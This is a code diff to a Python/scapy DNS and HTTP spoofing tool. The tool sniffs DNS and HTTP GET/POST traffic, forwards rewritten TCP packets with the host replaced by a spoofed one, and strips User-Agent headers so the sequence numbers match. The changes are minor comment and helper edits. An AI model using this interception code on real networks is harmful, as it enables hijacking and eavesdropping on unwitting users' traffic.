@@ -174,7 +174,6 @@ class DNS_Spoofer(threading.Thread):
             packet (scapy.packet.Packet): the packet that will be forwarded.
         """
         
-        #print("forwarding get packet")
         p = IP(dst=packet["IP"].dst, src=packet["IP"].src)/ \
             TCP(dport=packet["TCP"].dport, sport=packet["TCP"].sport, ack=packet["TCP"].ack, seq=packet["TCP"].seq, flags=packet["TCP"].flags)/ \
             Raw(load=packet.load)
@@ -196,12 +195,15 @@ class DNS_Spoofer(threading.Thread):
             Raw(load=packet.load.replace(host.encode("utf-8"), spoofed_host.encode("utf-8")))
         
         
-        #There's a problem when the load is increased, because the client says that he has read
-        #more bytes than the bytes that the server had sent. There's no problem if he says
+        #There's a problem when the load is increased, because the server says that he has read
+        #more bytes than the bytes that the client theorically sent. 
+        #Example: if the original get request is 20 bytes long, and then I change it to 25,
+        #the server says that he has received 25 bytes. As the client theorically sent only 20,
+        #an error occurs and it ignores what the server sends. There's no problem if he says
         #that he has read less bytes, so we simply take out user agents to reduce load length.
         if len(p.load) > len(packet.load): 
             diff1 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
-            agent = packet_utilities.get_user_agents(p.load)
+            agent = packet_utilities.get_header_attribute_from_http_load("User-Agent", p.load)
             p.load = p.load.replace(agent, b" ")
             diff2 = (packet["TCP"].seq + len(packet.load) - (p["TCP"].seq + len(p.load)))
             if diff2 < 0:
@@ -361,7 +363,7 @@ class DNS_Spoofer(threading.Thread):
         #con lo que puede perder algun paquete en ese proceso (cuando escribo esto aun no se ha dado el caso)
         
         #          es un paquete DNS y es IP (hay algunos que son ICMP host redirect) o bien es tcp, y en la capa raw tiene GET o POST
-            sniff(filter="udp or tcp and (dst port 80 or dst port 53)",# or src port 53)",
+            sniff(filter="udp or tcp and (dst port 80 or dst port 53)",
                   lfilter = lambda x: ((x.haslayer("DNS") and x.haslayer("IP")) or (x.haslayer("TCP") and x.haslayer("Raw") and ((b"POST" in x["Raw"].load) or (b"GET" in x["Raw"].load)))),
                   prn=self._handle_packet, store=False, timeout=self.timeout, stopperTimeout=3, stopper=self.exit_event.is_set)
                   
